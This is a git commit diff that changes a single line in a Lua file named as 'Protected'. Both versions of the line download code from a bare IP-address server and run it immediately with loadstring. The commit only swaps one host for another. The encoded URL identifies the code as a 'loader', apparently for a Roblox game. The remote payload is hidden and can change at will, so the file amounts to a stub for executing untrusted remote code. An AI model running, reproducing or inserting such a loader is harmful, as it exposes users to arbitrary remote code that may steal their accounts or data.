644df0b0b8d74ce66f62a36925383ef2fe9533db
bloxmake <arkothebest1@gmail.com>
2026-02-23 02:20:14 +0800

    Update Protected_6529145115182627.lua

--- Protected_6529145115182627.lua
+++ Protected_6529145115182627.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjQ3OGEyNWM2LTdhZDEtNGJlMS04NzBlLWU5YjRmYWNiM2ZlOCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjQ3OGEyNWM2LTdhZDEtNGJlMS04NzBlLWU5YjRmYWNiM2ZlOCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
